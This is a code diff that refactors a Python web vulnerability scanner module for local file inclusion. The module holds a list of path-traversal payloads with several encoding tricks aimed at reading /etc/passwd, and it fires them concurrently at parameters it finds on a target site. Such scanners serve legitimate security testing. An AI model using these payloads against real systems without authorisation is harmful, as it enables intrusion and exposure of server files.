@@ -1,8 +1,8 @@
-import requests
 import os
 import re
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
 from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from config import HTTP_HEADERS, DEFAULT_TIMEOUT
 from module.other import Other
 
@@ -12,70 +12,77 @@ class LFIScanner:
         self.target = args.target
         self.threads = args.threads
         self.verbose = args.verbose
-        self.payloads = [
-            "../../../../etc/passwd",
-            "../../../etc/passwd",
-            "../../../../../../etc/passwd",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd",
-            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-            "..%c0%af../etc/passwd",
-            "..%c1%9c../etc/passwd",
-            "..%e0%80%af../etc/passwd",
-            "..\\..\\..\\etc\\passwd",
-            "..%5c..%5c..%5cetc%5cpasswd",
-            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-            "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
-        ]
+        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
+        self.printer = Other()
+
+        self.payloads = self.load_payloads()
         self.common_params = ["file", "path", "page", "doc", "url", "template"]
-        self.guess_paths = [
+        self.guess_paths = self.load_guess_paths()
+
+    def load_payloads(self):
+        return [
+            "../../../../etc/passwd", "../../../etc/passwd", "../../../../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
+            "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "..%c0%af../etc/passwd",
+            "..%c1%9c../etc/passwd", "..%e0%80%af../etc/passwd",
+            "..\\..\\..\\etc\\passwd", "..%5c..%5c..%5cetc%5cpasswd",
+            "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
+        ]
+
+    def load_guess_paths(self):
+        return [
             "", "view", "include", "page", "show", "load", "download", "preview",
             "view.php", "include.php", "page.php", "show.php", "load.php",
             "index.php", "main.php"
         ]
-        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
-        self.printer = Other()
 
     def extract_params_from_dom(self):
         found = set()
         for proto in ["http", "https"]:
+            url = f"{proto}://{self.target}"
             try:
-                url = f"{proto}://{self.target}"
-                r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
-                soup = BeautifulSoup(r.text, "html.parser")
+                response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
+                soup = BeautifulSoup(response.text, "html.parser")
                 for tag in soup.find_all(["a", "form", "script"]):
                     attr = tag.get("href") or tag.get("action") or tag.string or ""
                     found.update(re.findall(r"[?&]([a-zA-Z0-9_-]+)=", attr))
             except Exception as e:
-                colored_module = self.printer.color_text(self.module_name, "cyan")
-                colored_error = self.printer.color_text(str(e), "red")
-                print(f"[!] [Module: {colored_module}] Failed extracting params from {url} - {colored_error}")
+                self.print_error("Failed extracting params from", url, e)
         return list(found.union(set(self.common_params)))
 
     def is_valid_passwd(self, text):
         if "root:x" in text and "nologin" in text:
-            lines = text.split()
-            return sum(1 for ln in lines if re.match(r"^[a-zA-Z0-9_-]+:x?:[0-9]+:[0-9]+:", ln)) >= 3
+            lines = text.splitlines()
+            return sum(1 for line in lines if re.match(r"^[a-zA-Z0-9_-]+:x?:[0-9]+:[0-9]+:", line)) >= 3
         return False
 
     def check_payload(self, url):
         try:
-            r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
-            if self.is_valid_passwd(r.text):
+            response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
+            if self.is_valid_passwd(response.text):
                 return url
-            if self.verbose:
-                colored_module = self.printer.color_text(self.module_name, "cyan")
-                colored_url = self.printer.color_text(url, "yellow")
-                print(f"[-] [Module: {colored_module}] [LFI Not Detected: {colored_url}]")
+            elif self.verbose:
+                self.print_status("Not Vuln", url, level="-")
         except Exception as e:
-            colored_module = self.printer.color_text(self.module_name, "cyan")
-            colored_url = self.printer.color_text(url, "yellow")
-            colored_error = self.printer.color_text(str(e), "red")
-            print(f"[!] [Module: {colored_module}] [Error checking {colored_url} - {colored_error}]")
+            self.print_error("Error checking", url, e)
         return None
+
+    def print_status(self, status_text, url, level="*"):
+        colored_module = self.printer.color_text(self.module_name, "cyan")
+        colored_url = self.printer.color_text(url, "yellow")
+        color = "green" if status_text.lower() == "vuln" else "red"
+        status_colored = self.printer.color_text(status_text, color)
+        print(f"[{level}] [Module: {colored_module}] [{status_colored}] {colored_url}")
+
+    def print_error(self, msg, url, error):
+        colored_module = self.printer.color_text(self.module_name, "cyan")
+        colored_url = self.printer.color_text(url, "yellow")
+        colored_error = self.printer.color_text(str(error), "red")
+        print(f"[!] [Module: {colored_module}] {msg} {colored_url} - {colored_error}")
 
     def run(self):
         colored_module = self.printer.color_text(self.module_name, "cyan")
+        print(f"[*] [Module: {colored_module}] Starting LFI scan on {self.target}")
         params = self.extract_params_from_dom()
         tasks = []
 
@@ -93,11 +100,10 @@ class LFIScanner:
             for future in as_completed(tasks):
                 result = future.result()
                 if result:
-                    colored_url = self.printer.color_text(result, "yellow")
-                    print(f"[+] [Module: {colored_module}] [LFI Detected: {colored_url}]")
+                    self.print_status("Vuln", result, level="+")
                     return [{"vulnerable": True, "payload": result}]
 
-        print(f"[*] [Module: {colored_module}] No LFI detected.")
+        self.print_status("Not Vuln", "No LFI detected", level="*")
         return [{"vulnerable": False}]
 
 
